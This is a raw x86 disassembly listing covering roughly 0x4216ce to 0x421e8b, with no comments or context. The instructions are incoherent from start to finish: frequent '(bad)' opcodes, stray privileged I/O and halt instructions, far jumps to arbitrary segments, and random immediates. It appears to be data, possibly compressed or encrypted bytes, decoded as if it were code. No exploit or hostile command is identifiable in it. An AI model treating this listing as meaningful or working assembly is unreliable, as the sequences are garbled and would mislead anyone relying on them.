  4216ce:	fimul  WORD PTR [eax-0x1]
  4216d1:	hlt    
  4216d2:	pushf  
  4216d3:	test   al,0xb5
  4216d5:	fs push esp
  4216d7:	ja     0x4216b2
  4216d9:	or     al,dl
  4216db:	push   esi
  4216dc:	mov    al,0x59
  4216de:	ja     0x4216c0
  4216e0:	je     0x421724
  4216e2:	xchg   ebx,eax
  4216e3:	lahf   
  4216e4:	xchg   esp,eax
  4216e5:	sbb    al,0x6a
  4216e7:	dec    ecx
  4216e8:	lods   al,BYTE PTR ds:[esi]
  4216e9:	sar    BYTE PTR [edi],1
  4216eb:	cdq    
  4216ec:	mov    edx,0xfeefddbc
  4216f1:	out    0xc0,al
  4216f3:	mov    ch,0x36
  4216f5:	es jp  0x42176d
  4216f8:	cmp    eax,0xb5577d34
  4216fd:	mov    eax,ds:0xaf7b68a1
  421702:	loop   0x421707
  421704:	fst    QWORD PTR [eax+eax*2-0x5c]
  421708:	inc    esp
  421709:	enter  0x1918,0x9e
  42170d:	sbb    DWORD PTR ds:0x82767092,ebx
  421713:	clc    
  421714:	aam    0x5a
  421716:	dec    edx
  421717:	int3   
  421718:	in     eax,0xef
  42171a:	stos   BYTE PTR es:[edi],al
  42171b:	and    al,0x6d
  42171d:	mov    esp,0xaa03ce6c
  421722:	sub    cl,ch
  421724:	pushf  
  421725:	pop    ss
  421726:	pop    edx
  421727:	mov    bl,0xf7
  421729:	push   0x72
  42172b:	add    edi,DWORD PTR [ebx]
  42172d:	inc    ecx
  42172e:	or     edx,DWORD PTR [eax-0x49be103a]
  421734:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421735:	and    cl,al
  421737:	icebp  
  421738:	or     al,0x13
  42173a:	adc    BYTE PTR [esp+esi*4+0x70],bh
  42173e:	xor    BYTE PTR [ebp-0x5f],ah
  421741:	adc    eax,0xad5c4c27
  421746:	jns    0x421772
  421748:	pop    edx
  421749:	xchg   edx,eax
  42174a:	xchg   esi,eax
  42174b:	lea    ebx,[eax]
  42174d:	cli    
  42174e:	xchg   ebp,eax
  42174f:	and    DWORD PTR [ebp+0x60],ebx
  421752:	rcl    ah,cl
  421754:	pop    esp
  421755:	cli    
  421756:	jge    0x4217ad
  421758:	push   esp
  421759:	mov    cl,0x61
  42175b:	mov    eax,ds:0x9f79768f
  421760:	adc    BYTE PTR [edx],dh
  421762:	add    eax,0xbc8301e0
  421767:	xchg   ebx,eax
  421768:	jp     0x42171a
  42176a:	push   ebx
  42176b:	sbb    DWORD PTR [ecx],ebp
  42176d:	and    eax,0xe8517d68
  421772:	jl     0x4216fe
  421774:	push   cs
  421775:	loop   0x421786
  421777:	imul   ebx,DWORD PTR [edi],0xffffffdb
  42177a:	xor    esp,0x12e1c77a
  421780:	xor    ch,bh
  421782:	jg     0x4217c1
  421784:	iret   
  421785:	lds    ecx,FWORD PTR ds:0xba500800
  42178b:	jle    0x421741
  42178d:	mov    al,BYTE PTR [ebp+0x3b]
  421790:	inc    esi
  421791:	and    cl,BYTE PTR [edi-0xe]
  421794:	and    ebp,DWORD PTR [edi+0x2]
  421797:	ficom  DWORD PTR [ebp+esi*4+0x11]
  42179b:	mov    edi,0x6864877a
  4217a0:	mov    ebp,0x7c911b72
  4217a5:	(bad)  
  4217a6:	push   esi
  4217a7:	in     al,dx
  4217a8:	cmp    eax,0x69a2f5d2
  4217ad:	fimul  WORD PTR [ecx]
  4217af:	lods   eax,DWORD PTR ds:[esi]
  4217b0:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217b2:	rcr    DWORD PTR [eax-0x72],cl
  4217b5:	icebp  
  4217b6:	adc    ah,BYTE PTR [eax]
  4217b8:	(bad)  
  4217b9:	loopne 0x4217e1
  4217bb:	mov    gs,WORD PTR [ecx+0x3f]
  4217be:	pop    esp
  4217bf:	cmp    dh,ch
  4217c1:	inc    ebx
  4217c2:	and    ah,dh
  4217c4:	fild   WORD PTR [esi-0x5f]
  4217c7:	push   esi
  4217c8:	xchg   BYTE PTR [bp-0x5d],ah
  4217cc:	dec    ebx
  4217cd:	sti    
  4217ce:	hlt    
  4217cf:	data16 mov bh,0x11
  4217d2:	test   eax,0x56177426
  4217d7:	fsub   st,st(6)
  4217d9:	test   eax,0xc350e8d2
  4217de:	stos   BYTE PTR es:[edi],al
  4217df:	sbb    edx,esp
  4217e1:	(bad)  
  4217e2:	jl     0x421766
  4217e4:	push   esp
  4217e5:	or     eax,0x2d07a156
  4217ea:	int3   
  4217eb:	js     0x42182d
  4217ed:	xor    eax,0xa8c2123e
  4217f2:	add    DWORD PTR [ebx+0x3f],ecx
  4217f5:	xor    eax,DWORD PTR [esi-0x436cc2eb]
  4217fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4217fc:	xchg   esi,eax
  4217fd:	ins    BYTE PTR es:[edi],dx
  4217fe:	jo     0x421879
  421800:	push   ebx
  421801:	xchg   ebx,eax
  421802:	push   ebx
  421803:	test   DWORD PTR [eax-0x1fd1787f],esp
  421809:	push   es
  42180a:	pop    ds
  42180b:	push   0x78822461
  421810:	jno    0x421875
  421812:	sub    BYTE PTR [edx+edi*2+0x7df228ca],cl
  421819:	es mov ebx,0xee6c2fb0
  42181f:	(bad)  
  421820:	dec    ebp
  421821:	sbb    eax,0x88e4fc28
  421826:	les    ebp,FWORD PTR [ebx-0x61b2ccb4]
  42182c:	lock sub ebp,DWORD PTR [ebx+0x1910ba8f]
  421833:	xchg   ecx,eax
  421834:	mov    edi,0x705ead6
  421839:	pop    eax
  42183a:	mov    eax,0xb02066f9
  42183f:	ja     0x42182f
  421841:	xor    eax,0xda3868d1
  421846:	lds    esp,FWORD PTR [ebx]
  421848:	shl    eax,cl
  42184a:	or     ebx,DWORD PTR [edx-0x27a716fe]
  421850:	add    cl,cl
  421852:	push   cs
  421853:	loope  0x42180d
  421855:	push   eax
  421856:	pop    ss
  421857:	and    BYTE PTR [eax-0x5],bh
  42185a:	adc    esi,eax
  42185c:	dec    esp
  42185d:	adc    dh,al
  42185f:	inc    edi
  421860:	shl    BYTE PTR [ebx-0x2919af44],0x65
  421867:	cmp    eax,0x58082446
  42186c:	pop    eax
  42186d:	in     al,0xb4
  42186f:	es scas eax,DWORD PTR es:[edi]
  421871:	cmp    al,0x7
  421873:	fdiv   QWORD PTR [edx]
  421875:	xchg   ebp,eax
  421876:	xchg   ecx,eax
  421877:	sahf   
  421878:	in     eax,dx
  421879:	call   0x49ff:0xb428f978
  421880:	cmp    DWORD PTR [ebx+ecx*8-0x3a6e4a85],ecx
  421887:	mov    ds:0xed08cc6f,eax
  42188c:	mov    eax,ds:0x15b35faf
  421891:	jbe    0x4218f1
  421893:	inc    esi
  421894:	test   BYTE PTR [ebx-0x6c],dl
  421897:	and    DWORD PTR [esp+esi*2-0x72d633d2],0x3b
  42189f:	imul   edi,DWORD PTR [edi+0x12867de8],0xc65df8ec
  4218a9:	jbe    0x421928
  4218ab:	in     al,0x16
  4218ad:	je     0x421856
  4218af:	aam    0x96
  4218b1:	shr    eax,0xb4
  4218b4:	stos   DWORD PTR es:[edi],eax
  4218b5:	or     edi,DWORD PTR [esi-0x2bf694a4]
  4218bb:	cld    
  4218bc:	adc    esi,ebx
  4218be:	ror    DWORD PTR [esi+0x50840a72],0x68
  4218c5:	and    cl,al
  4218c7:	jmp    0x99a7:0xa96f80a5
  4218ce:	mov    al,0xd4
  4218d0:	sub    ebp,DWORD PTR [ebx-0x7]
  4218d3:	repnz inc edi
  4218d5:	or     BYTE PTR [esp+ecx*1],ch
  4218d8:	js     0x421933
  4218da:	mov    bl,0xc7
  4218dc:	pop    ss
  4218dd:	mul    DWORD PTR [ebp-0x446ca6c8]
  4218e3:	xchg   ebx,eax
  4218e4:	popa   
  4218e5:	ins    BYTE PTR es:[edi],dx
  4218e6:	ret    
  4218e7:	mov    ah,0x86
  4218e9:	jp     0x4218c3
  4218eb:	pop    eax
  4218ec:	fisttp QWORD PTR [edi]
  4218ee:	and    al,0x75
  4218f0:	fsub   DWORD PTR [esp+ecx*4]
  4218f3:	push   0x95efe1a3
  4218f8:	mul    esi
  4218fa:	xchg   edx,eax
  4218fb:	enter  0x45c3,0xb6
  4218ff:	ficom  DWORD PTR [edx-0x25cc7402]
  421905:	(bad)  
  421906:	aas    
  421907:	stos   BYTE PTR es:[edi],al
  421908:	cmp    ch,dh
  42190a:	rol    BYTE PTR [edx+ecx*2+0x64f7b6db],0xaf
  421912:	jae    0x421914
  421914:	pop    edi
  421915:	mov    BYTE PTR [ecx+0x73],ah
  421918:	mov    edx,0x90d20463
  42191d:	push   eax
  42191e:	inc    ebx
  42191f:	mov    esp,0x5318cad5
  421924:	push   0xd4130c49
  421929:	sbb    DWORD PTR [ebx-0x6a7667b],edx
  42192f:	push   edi
  421930:	in     eax,dx
  421931:	fild   DWORD PTR [ebx-0x1b02ba31]
  421937:	cld    
  421938:	ins    DWORD PTR es:[edi],dx
  421939:	call   DWORD PTR [ebx-0x27c92179]
  42193f:	xor    ch,0xff
  421942:	sub    BYTE PTR [edi],bl
  421944:	mov    BYTE PTR [edi+0x804700e],dl
  42194a:	or     BYTE PTR [esi-0x1b],dh
  42194d:	xchg   esp,eax
  42194e:	fmul   QWORD PTR [esi]
  421950:	(bad)  [esi-0x27]
  421953:	bound  ecx,QWORD PTR [edx]
  421955:	iret   
  421956:	inc    edi
  421957:	lock rol DWORD PTR [eax+0x54],0xfd
  42195c:	addr16 mov ecx,0x506e26fd
  421962:	lds    esp,FWORD PTR [ebx+0x5d]
  421965:	ins    BYTE PTR es:[edi],dx
  421966:	das    
  421967:	jmp    0xfff4:0x56a3f1ed
  42196e:	fld    QWORD PTR [edx]
  421970:	push   edx
  421971:	fild   QWORD PTR [ebp-0x67]
  421974:	and    al,0x70
  421976:	ret    0xdd24
  421979:	jbe    0x4219e5
  42197b:	sub    DWORD PTR [esi+0x21cd8953],ebx
  421981:	fcmovu st,st(0)
  421983:	rcr    BYTE PTR [edi],0xba
  421986:	gs push 0xffffffdd
  421989:	jl     0x4219ff
  42198b:	sub    BYTE PTR [edi+0x53],bh
  42198e:	shr    BYTE PTR [ecx],0x45
  421991:	imul   ecx,DWORD PTR [edx-0x73],0xffffffb9
  421995:	jmp    0x4e2548b3
  42199a:	and    bh,BYTE PTR [esi+0xd]
  42199d:	test   bl,ah
  42199f:	mov    cl,0x46
  4219a1:	pusha  
  4219a2:	(bad)  
  4219a3:	ins    BYTE PTR es:[edi],dx
  4219a4:	out    0x8b,al
  4219a6:	mov    bl,0xf9
  4219a8:	cmp    eax,0x3d410976
  4219ad:	into   
  4219ae:	js     0x4219c7
  4219b0:	mov    ds:0x3d5a59fb,eax
  4219b5:	xor    eax,0x83f6628
  4219ba:	push   esi
  4219bb:	sub    esi,esp
  4219bd:	cmp    eax,0x35579a47
  4219c2:	cmp    al,0x76
  4219c4:	mov    es,WORD PTR [ebp-0x7b]
  4219c7:	in     eax,dx
  4219c8:	mul    BYTE PTR [edi]
  4219ca:	xor    al,0x86
  4219cc:	dec    eax
  4219cd:	mov    cl,0x1a
  4219cf:	call   0x31ef216b
  4219d4:	jnp    0x421966
  4219d6:	das    
  4219d7:	ret    
  4219d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4219d9:	sbb    ecx,DWORD PTR [edx+edx*1-0x6ef7a856]
  4219e0:	jno    0x42197e
  4219e2:	jl     0x421a12
  4219e4:	jg     0x4219ab
  4219e6:	xor    cl,dh
  4219e8:	scas   eax,DWORD PTR es:[edi]
  4219e9:	into   
  4219ea:	mov    WORD PTR [edi],fs
  4219ec:	scas   eax,DWORD PTR es:[edi]
  4219ed:	stos   BYTE PTR es:[edi],al
  4219ee:	jl     0x4219a9
  4219f0:	loopne 0x421a00
  4219f2:	sbb    ebp,ebx
  4219f4:	jno    0x421998
  4219f6:	mov    dh,0x68
  4219f8:	adc    eax,0xe8adeb88
  4219fd:	sahf   
  4219fe:	jmp    0xe21:0xc06e2ce5
  421a05:	pushf  
  421a06:	outs   dx,BYTE PTR ds:[esi]
  421a07:	dec    ebx
  421a08:	jne    0x421a3c
  421a0a:	div    BYTE PTR [ebx+0x11fb0274]
  421a10:	iret   
  421a11:	xchg   DWORD PTR [eax+0x5f],ebp
  421a14:	xlat   BYTE PTR ds:[ebx]
  421a15:	leave  
  421a16:	mov    cl,0x4c
  421a18:	sbb    ecx,ebp
  421a1a:	shl    BYTE PTR [ebx+0x3a524806],0x46
  421a21:	jb     0x4219b8
  421a23:	iret   
  421a24:	out    0xf8,eax
  421a26:	ror    DWORD PTR [ebp+0x1b],0xda
  421a2a:	scas   al,BYTE PTR es:[edi]
  421a2b:	xchg   ebp,eax
  421a2c:	xchg   ebx,eax
  421a2d:	jle    0x4219d4
  421a2f:	mov    al,ds:0x8310c918
  421a34:	mov    ch,0x43
  421a36:	sbb    BYTE PTR ds:0xea334aa2,ch
  421a3c:	mov    ecx,0x228363cd
  421a41:	or     ah,BYTE PTR [edx]
  421a43:	(bad)  
  421a45:	push   cs
  421a46:	int    0x86
  421a48:	cwde   
  421a49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a4a:	imul   edi,DWORD PTR [eax-0x4f0bf794],0x1d8f723e
  421a54:	pcmpgtw mm5,mm6
  421a57:	aaa    
  421a58:	imul   esi,DWORD PTR [eax-0x70414b42],0x1eb84026
  421a62:	push   0x3b
  421a64:	ret    
  421a65:	rcl    cl,cl
  421a67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a68:	jg     0x421a10
  421a6a:	push   ebp
  421a6b:	inc    ebp
  421a6c:	cmp    al,0xa0
  421a6e:	add    eax,0x21ff8588
  421a73:	cmp    al,bl
  421a75:	call   DWORD PTR [ebx+ebp*2+0x7cbf2ad8]
  421a7c:	add    eax,0xfc6a7d3d
  421a81:	ja     0x421afc
  421a83:	out    dx,al
  421a84:	mov    ds:0x59fa75d6,al
  421a89:	pop    edx
  421a8a:	dec    esi
  421a8b:	test   al,0xd8
  421a8d:	mov    ds:0x38cf5281,eax
  421a92:	dec    esp
  421a93:	cmp    al,0xa7
  421a95:	scas   eax,DWORD PTR es:[edi]
  421a96:	sbb    DWORD PTR [eax-0x1e405526],ebx
  421a9c:	das    
  421a9d:	or     esi,ebp
  421a9f:	sbb    DWORD PTR [ebp-0x29042bdf],ecx
  421aa5:	(bad)  
  421aa6:	cmp    DWORD PTR [ebp+0x32],ebx
  421aa9:	add    BYTE PTR [edx],0x30
  421aac:	fsubp  st(7),st
  421aae:	inc    edx
  421aaf:	js     0x421b0f
  421ab1:	mov    dh,0xa9
  421ab3:	lock xor al,0x63
  421ab6:	jno    0x421b17
  421ab8:	pushf  
  421ab9:	loope  0x421b2b
  421abb:	daa    
  421abc:	and    al,BYTE PTR [ecx+edi*8+0x6f]
  421ac0:	jne    0x421b00
  421ac2:	iret   
  421ac3:	mov    ecx,0xef07ca86
  421ac8:	(bad)  
  421ac9:	pushf  
  421aca:	or     esp,esp
  421acc:	fwait
  421acd:	sbb    eax,0x3f1982e7
  421ad2:	neg    BYTE PTR [edx-0x304b99af]
  421ad8:	cmc    
  421ad9:	ret    
  421ada:	mov    ds:0x5deaa2d8,al
  421adf:	mov    cl,0x6b
  421ae1:	fsubr  st(6),st
  421ae3:	mov    ecx,0x5735bc63
  421ae8:	xchg   esp,eax
  421ae9:	bound  edi,QWORD PTR [ebp-0x28416bf9]
  421aef:	pushf  
  421af0:	and    dl,dl
  421af2:	pop    eax
  421af3:	pop    edi
  421af4:	iret   
  421af5:	sub    eax,DWORD PTR [esi]
  421af7:	pop    ebp
  421af8:	xor    al,0x2e
  421afa:	stos   DWORD PTR es:[edi],eax
  421afb:	jbe    0x421b47
  421afd:	mov    edi,fs
  421aff:	dec    ebp
  421b00:	das    
  421b01:	mov    edi,0xd2675726
  421b06:	mov    al,0x45
  421b08:	je     0x421b4b
  421b0a:	inc    ecx
  421b0b:	or     BYTE PTR [eax+esi*1+0x42],dl
  421b0f:	shl    ah,cl
  421b11:	test   DWORD PTR [ebx-0x59],0x5bcc37af
  421b18:	scas   eax,DWORD PTR es:[di]
  421b1a:	mov    bl,0x45
  421b1c:	sbb    BYTE PTR [bp-0x4e97],bl
  421b21:	jg     0x421b94
  421b23:	sbb    dh,BYTE PTR [edi-0x57a044d4]
  421b29:	in     eax,0xe2
  421b2b:	jno    0x421b99
  421b2d:	lahf   
  421b2e:	jne    0x421ac9
  421b30:	retf   0x4985
  421b33:	adc    DWORD PTR [ecx+ebx*4+0x54],edi
  421b37:	sbb    bl,BYTE PTR [esi]
  421b39:	and    DWORD PTR [edi+0x481c5e95],eax
  421b3f:	sbb    BYTE PTR [ebp-0x74b82faf],bl
  421b45:	ja     0x421bbc
  421b47:	inc    ebp
  421b48:	xchg   DWORD PTR [eax+0x1a],ebx
  421b4b:	mov    al,ds:0xf9e161da
  421b50:	mov    edi,0xf603d56d
  421b55:	test   DWORD PTR [esi],0xb0eafb7c
  421b5b:	xlat   BYTE PTR ds:[ebx]
  421b5c:	popf   
  421b5d:	pop    ds
  421b5e:	(bad)  
  421b5f:	pusha  
  421b60:	ja     0x421b6e
  421b62:	out    0x91,eax
  421b64:	jno    0x421b7a
  421b66:	inc    ebx
  421b67:	in     eax,0xf
  421b69:	lahf   
  421b6a:	test   DWORD PTR [eax],edx
  421b6c:	in     eax,dx
  421b6d:	or     esp,DWORD PTR [esi+0x4d8f1c9f]
  421b73:	jmp    0x421b72
  421b75:	idiv   BYTE PTR [eax+0x51]
  421b78:	(bad)  
  421b79:	pop    ebp
  421b7a:	call   0xb842b747
  421b7f:	lea    eax,[edx+0x63]
  421b82:	mov    ebx,eax
  421b84:	sbb    BYTE PTR [edi+0x36],cl
  421b87:	sahf   
  421b88:	sbb    bh,bl
  421b8a:	jp     0x421b90
  421b8c:	daa    
  421b8d:	mov    ds:0xd945a0f9,eax
  421b92:	mov    eax,0xb675c604
  421b97:	out    dx,al
  421b98:	pushf  
  421b99:	sbb    eax,DWORD PTR [edx]
  421b9b:	aam    0xdc
  421b9d:	popf   
  421b9e:	mov    ?,WORD PTR [ebp+edi*8-0x6e]
  421ba2:	call   DWORD PTR [ebx+esi*2-0x660514b1]
  421ba9:	mov    edi,0x4da63adf
  421bae:	ss xchg edi,eax
  421bb0:	mov    al,0xd1
  421bb2:	ins    DWORD PTR es:[edi],dx
  421bb3:	inc    edi
  421bb4:	xchg   ecx,eax
  421bb5:	xor    al,0x71
  421bb7:	add    cl,dh
  421bb9:	mov    al,ds:0xb4dc6d97
  421bbe:	adc    al,0x29
  421bc0:	xchg   edi,eax
  421bc1:	aad    0xcd
  421bc3:	xchg   ch,dh
  421bc5:	scas   eax,DWORD PTR es:[edi]
  421bc6:	lock dec esi
  421bc8:	mov    bl,0x7d
  421bca:	sahf   
  421bcb:	cwde   
  421bcc:	dec    ecx
  421bcd:	jo     0x421b9c
  421bcf:	jmp    0xaf5e:0xb078cfd
  421bd6:	or     BYTE PTR [esi-0x8],ah
  421bd9:	fstp   TBYTE PTR [esi]
  421bdb:	mov    bl,0xee
  421bdd:	fnstsw WORD PTR [ebp-0x3195119c]
  421be3:	sti    
  421be4:	push   esi
  421be5:	or     esp,DWORD PTR [eax+0x21534533]
  421beb:	lods   al,BYTE PTR ds:[esi]
  421bec:	mov    al,ds:0x43ea2c1a
  421bf1:	push   ebp
  421bf2:	adc    bh,bh
  421bf4:	popf   
  421bf5:	adc    al,0x4d
  421bf7:	push   eax
  421bf8:	daa    
  421bf9:	jl     0x421bfc
  421bfb:	push   esp
  421bfc:	xor    eax,0x14fd
	...
  421c09:	add    BYTE PTR [esi+0x43],dl
  421c0c:	pop    edx
  421c0d:	pop    ecx
  421c0e:	pop    edi
  421c0f:	pop    ecx
  421c10:	push   edi
  421c11:	dec    edi
  421c12:	mov    fs,WORD PTR [ecx-0x10c2168e]
  421c18:	jno    0x421bb1
  421c1a:	mov    ebx,0x7d0001aa
  421c1f:	push   es
  421c20:	add    BYTE PTR [eax],al
  421c22:	jno    0x421be0
  421c24:	adc    dh,ch
  421c26:	mov    edx,0xcba55727
  421c2b:	xchg   edx,eax
  421c2c:	dec    ecx
  421c2d:	int3   
  421c2e:	jno    0x421bcf
  421c30:	in     al,dx
  421c31:	outs   dx,BYTE PTR ds:[esi]
  421c32:	lahf   
  421c33:	adc    edi,esp
  421c35:	or     al,0x8a
  421c37:	outs   dx,BYTE PTR ds:[esi]
  421c38:	fistp  WORD PTR cs:[edi+0x25d9798a]
  421c3f:	jmp    0x421c5f
  421c41:	add    DWORD PTR [eax+0x2d614401],ebx
  421c47:	loopne 0x421bc9
  421c49:	stos   BYTE PTR es:[edi],al
  421c4a:	mov    eax,ds:0xc23fa607
  421c4f:	imul   ebp,DWORD PTR ds:0xbc3689e2,0x37
  421c56:	sbb    DWORD PTR [esi],esp
  421c58:	mov    ah,0x82
  421c5a:	loope  0x421bdd
  421c5c:	sub    eax,0x6a2b3a80
  421c61:	jo     0x421c00
  421c63:	(bad)  
  421c65:	add    cl,bl
  421c67:	cmc    
  421c68:	xchg   esi,eax
  421c69:	lock leave 
  421c6b:	mov    ah,0x64
  421c6d:	dec    edi
  421c6e:	aad    0x28
  421c70:	ror    BYTE PTR [eax+0x52c81b53],cl
  421c76:	js     0x421c87
  421c78:	inc    esi
  421c79:	inc    esi
  421c7a:	(bad)  
  421c7b:	cmc    
  421c7c:	ds (bad) 
  421c7e:	sbb    esp,edx
  421c80:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  421c82:	jmp    0xf0f5:0xa04546a
  421c89:	push   0x68
  421c8b:	sahf   
  421c8c:	push   ecx
  421c8d:	push   edx
  421c8e:	or     al,BYTE PTR [eax]
  421c90:	cld    
  421c91:	inc    esp
  421c92:	fisttp QWORD PTR [ebx-0x41]
  421c95:	or     bh,BYTE PTR [ecx]
  421c97:	dec    eax
  421c98:	scas   eax,DWORD PTR es:[edi]
  421c99:	ins    DWORD PTR es:[edi],dx
  421c9a:	pop    ebp
  421c9b:	daa    
  421c9c:	pop    esi
  421c9d:	mov    ecx,0xe3610b0d
  421ca2:	aad    0xa8
  421ca4:	add    esp,DWORD PTR [edi]
  421ca6:	vpunpcklqdq ymm6,ymm2,ymm5
  421caa:	outs   dx,BYTE PTR ds:[esi]
  421cab:	mov    ds:0x1e5a5157,al
  421cb0:	cmc    
  421cb1:	cld    
  421cb2:	add    ebx,DWORD PTR [edi+0x474ba694]
  421cb8:	imul   ecx,esp,0x75c249ad
  421cbe:	or     DWORD PTR [ebx-0x30],0xffffffa9
  421cc2:	jmp    0x12ef:0xd2050dae
  421cc9:	neg    BYTE PTR [ebp+0x460e7021]
  421ccf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421cd0:	out    0x56,eax
  421cd2:	ins    BYTE PTR es:[edi],dx
  421cd3:	mov    DWORD PTR [eax+0x26],ebx
  421cd6:	mov    cl,0xb6
  421cd8:	lds    ebx,FWORD PTR [ecx+0x6b5b3800]
  421cde:	jns    0x421c88
  421ce0:	(bad)  
  421ce2:	popf   
  421ce3:	cs cmp al,0xaa
  421ce6:	sub    eax,0xd65242df
  421ceb:	mov    edi,0xe3b341cf
  421cf0:	xchg   edx,eax
  421cf1:	inc    esi
  421cf2:	call   0xf81c9042
  421cf7:	jae    0x421cb5
  421cf9:	xor    DWORD PTR [eax-0x2c],eax
  421cfc:	pop    edx
  421cfd:	dec    esp
  421cfe:	inc    ebx
  421cff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d00:	iret   
  421d01:	dec    ebx
  421d02:	idiv   DWORD PTR [edx-0x622b02d2]
  421d08:	(bad)  
  421d09:	push   ebp
  421d0a:	bound  eax,QWORD PTR ds:0xc9d09d6e
  421d10:	cmp    BYTE PTR [edi-0xbf08818],0x3
  421d17:	hlt    
  421d18:	(bad)  
  421d19:	std    
  421d1a:	mov    ebp,0xda6e52df
  421d1f:	clc    
  421d20:	push   ebp
  421d21:	arpl   dx,si
  421d23:	addr16 in eax,0xea
  421d26:	pushf  
  421d27:	mov    ds,eax
  421d29:	addr16 push ds
  421d2b:	out    0x91,al
  421d2d:	aad    0x1a
  421d2f:	hlt    
  421d30:	outs   dx,DWORD PTR ds:[esi]
  421d31:	retf   0x13e8
  421d34:	push   cs
  421d35:	fs xchg bl,al
  421d38:	jmp    0xeee2114c
  421d3d:	pop    ss
  421d3e:	pop    edx
  421d3f:	adc    BYTE PTR [ebx-0x33],0x9d
  421d43:	push   ebx
  421d44:	pop    edx
  421d45:	dec    ecx
  421d46:	pop    edx
  421d47:	push   es
  421d48:	or     al,0x99
  421d4a:	es jg  0x421d7f
  421d4d:	jge    0x421d91
  421d4f:	mov    bh,0x52
  421d51:	popa   
  421d52:	mov    ebp,DWORD PTR [eax]
  421d54:	(bad)  
  421d55:	das    
  421d56:	stos   DWORD PTR es:[edi],eax
  421d57:	(bad)  
  421d58:	lock xchg DWORD PTR [esi+ebp*8+0x71],ecx
  421d5d:	fdivr  QWORD PTR [si+0x7c]
  421d61:	pop    ebx
  421d62:	dec    edx
  421d63:	fst    QWORD PTR [ecx]
  421d65:	pop    es
  421d66:	ror    dl,cl
  421d68:	mov    ebx,DWORD PTR [ebx-0x582fe8d5]
  421d6e:	inc    eax
  421d6f:	rcl    BYTE PTR ds:0x6f36d1e3,0xf4
  421d76:	pop    edi
  421d77:	sbb    eax,0x5cc29014
  421d7c:	div    BYTE PTR [ecx]
  421d7e:	jge    0x421d7d
  421d80:	arpl   WORD PTR [edx],si
  421d82:	pushf  
  421d83:	fbld   TBYTE PTR [eax+0x38fac21b]
  421d89:	aam    0x71
  421d8b:	jo     0x421d9a
  421d8d:	dec    ebp
  421d8e:	test   eax,0xc6770055
  421d93:	xchg   ecx,eax
  421d94:	std    
  421d95:	pop    ecx
  421d96:	mov    bl,0x24
  421d98:	dec    esp
  421d99:	push   esp
  421d9a:	xor    DWORD PTR [ebp+0x112f5e7f],ebx
  421da0:	icebp  
  421da1:	cmp    ecx,esp
  421da3:	mov    al,0xea
  421da5:	pop    edi
  421da6:	inc    eax
  421da7:	sar    BYTE PTR [ecx-0x6b17cdfd],0x4c
  421dae:	mov    edx,0x30079bd6
  421db3:	nop
  421db4:	xchg   ebx,eax
  421db5:	inc    esp
  421db6:	rol    DWORD PTR ds:[ebx+0x3de6cb1c],0xda
  421dbe:	cmc    
  421dbf:	jecxz  0x421d5b
  421dc1:	loope  0x421d98
  421dc3:	test   al,0x9c
  421dc5:	mov    ch,0x2f
  421dc7:	sub    al,0xcc
  421dc9:	(bad)  
  421dca:	aad    0x2e
  421dcc:	jmp    0x7ce7c586
  421dd1:	push   esi
  421dd2:	jmp    0x59920ee9
  421dd7:	pop    ebx
  421dd8:	je     0x421d65
  421dda:	call   0xc63c:0x4de3f5f5
  421de1:	(bad)  
  421de3:	dec    ebp
  421de4:	jnp    0x421e60
  421de6:	outs   dx,DWORD PTR es:[esi]
  421de8:	mov    WORD PTR [ebx+0x6],fs
  421deb:	addr16 retf 0x5e94
  421def:	xchg   BYTE PTR [edi+0x1d],ah
  421df2:	daa    
  421df3:	jne    0x421d76
  421df5:	xor    cl,BYTE PTR [ebp-0x4aa99b7d]
  421dfb:	inc    ebx
  421dfc:	daa    
  421dfd:	adc    edi,edi
  421dff:	and    ebx,eax
  421e01:	outs   dx,BYTE PTR ds:[esi]
  421e02:	or     edi,DWORD PTR [edi]
  421e04:	push   esp
  421e05:	or     ebp,DWORD PTR [esi]
  421e07:	jmp    0x7666dde1
  421e0c:	(bad)  [eax+0xb]
  421e0f:	jnp    0x421d9a
  421e11:	jp     0x421df7
  421e13:	mov    ah,BYTE PTR fs:[esi]
  421e16:	mov    al,0xef
  421e18:	push   cs
  421e19:	loop   0x421dfa
  421e1b:	sub    al,0xf9
  421e1d:	sbb    BYTE PTR [ebx-0x5],dl
  421e20:	rcr    DWORD PTR [eax-0x21],0xd2
  421e24:	stos   DWORD PTR es:[edi],eax
  421e25:	rcr    BYTE PTR [eax+eax*8],cl
  421e28:	out    0x89,al
  421e2a:	dec    ebp
  421e2b:	mov    esp,0xedd0ef45
  421e30:	sti    
  421e31:	jp     0x421ea2
  421e33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e34:	inc    esi
  421e35:	pop    ss
  421e36:	in     al,0x30
  421e38:	(bad)  
  421e39:	or     eax,0xf83029dd
  421e3e:	in     eax,0x45
  421e40:	mov    bh,0xce
  421e42:	loope  0x421dea
  421e44:	inc    esi
  421e45:	mov    esp,0xda9468ac
  421e4a:	enter  0x8904,0x3f
  421e4e:	ins    BYTE PTR es:[edi],dx
  421e4f:	outs   dx,BYTE PTR ds:[esi]
  421e50:	cmp    DWORD PTR [edi],ebx
  421e52:	jb     0x421e79
  421e54:	cmp    eax,DWORD PTR ds:0x994ac66
  421e5a:	daa    
  421e5b:	ss aad 0x3
  421e5e:	xor    cl,BYTE PTR [ebx-0x4bdf2bdd]
  421e64:	and    bl,BYTE PTR ds:0x80635afc
  421e6a:	leave  
  421e6b:	jmp    0xf4c0:0xae9c5cfb
  421e72:	or     ebp,DWORD PTR [ebx-0x62]
  421e75:	jp     0x421e3d
  421e77:	and    BYTE PTR [esi-0x1a],bh
  421e7a:	or     DWORD PTR [ecx+0x1d],edi
  421e7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e7e:	inc    esi
  421e7f:	and    BYTE PTR [eax+ecx*1],dh
  421e82:	pop    ebx
  421e83:	sub    ecx,esi
  421e85:	dec    esp
  421e86:	shr    cl,cl
  421e88:	pop    edx
  421e89:	outs   dx,DWORD PTR ds:[si]
  421e8b:	and    ch,BYTE PTR [ecx-0x5f51498f]
